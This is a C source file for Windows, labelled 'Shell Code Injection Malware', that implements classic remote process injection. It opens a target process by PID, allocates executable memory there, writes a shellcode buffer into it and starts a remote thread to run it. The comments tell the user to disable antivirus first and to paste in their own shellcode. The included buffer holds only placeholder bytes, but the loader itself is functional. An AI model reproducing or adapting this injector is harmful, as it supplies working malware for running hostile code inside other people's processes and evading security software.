#include <windows.h>
#include <stdio.h>

//Shell Code Injection Malware
//Run by compiling and running an executable with the PID of the target in a terminal
//Disable any AV scanners before running

const char* k = "[+]"; 
const char* i = "[+]";
const char* e = "[+]";
//AKA UNISGNED LONG PID = NULL;
DWORD PID, TID = NULL;
//LPVOID: Pointer to any type
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;
//Put the shell code of your program here
unsigned char puke[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xcc";

int main(int argc, char* argv[]) {
	if (argc < 2) {
		printf("%s usage: program.exe <PID>", e);
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	printf("%s trying to open a handle to process (%ld) \n", i, PID);
	
	hProcess = OpenProcess(
		//Desire Access
		PROCESS_ALL_ACCESS,
		//Inherit Handle
		false,
		//PID
		PID);
	printf("%s got a handle to the process!\n\\---0x%p\n", k, hProcess);
	if (hProcess == NULL) {
		printf("%s couldn't get a handle to the process (%ld), error: %ld", e, PID, GetLastError());

	}
	//Allocate Bytes
	rBuffer = VirtualAllocEx(
		hProcess,
		//IP Address (NULL lets the function decide where)
		NULL,
		//Size of allocation
		sizeof(puke),
		//Allocation Type- type of memory allocation we are using
		(MEM_COMMIT | MEM_RESERVE),
		//Permissions of our memory
		PAGE_EXECUTE_READWRITE);
	printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions \n", k, sizeof(puke));

	WriteProcessMemory(hProcess, rBuffer, puke, sizeof(puke), NULL);
	printf("%s wrote %zu-bytes to process memory\n", k, sizeof(puke));

	//Thread to run payload
	hThread = CreateRemoteThreadEx(
		 hProcess, /*Handle*/
		 NULL,  /*Securit Attributes*/
		 0, /*Size (0 for default)*/
		 (LPTHREAD_START_ROUTINE)rBuffer,  /*Starting point of execution for the thread*/
		NULL, /*IP Parameter*/
		0,  /*Creation Flags*/
		0, /*Attribute List for LPProc*/ 
		&TID); /*Thread ID*/

	//If remote thread wasn't made
	if (hThread == NULL) {
		printf("%s failed to get a handle to the thread, error %ld", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	
	printf("%s got a handle to the thread (%ld)\n\\--0x%p\n", k, TID, hThread);
	
	printf("%s waiting for a thread to finish\n", i);
	WaitForSingleObject(hThread, INFINITE);
	printf("%s thread finished executing \n", k);

	printf("%s cleaning up \n", i);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("%s is finished! See you next time!\n", k);

	return EXIT_SUCCESS;	
}
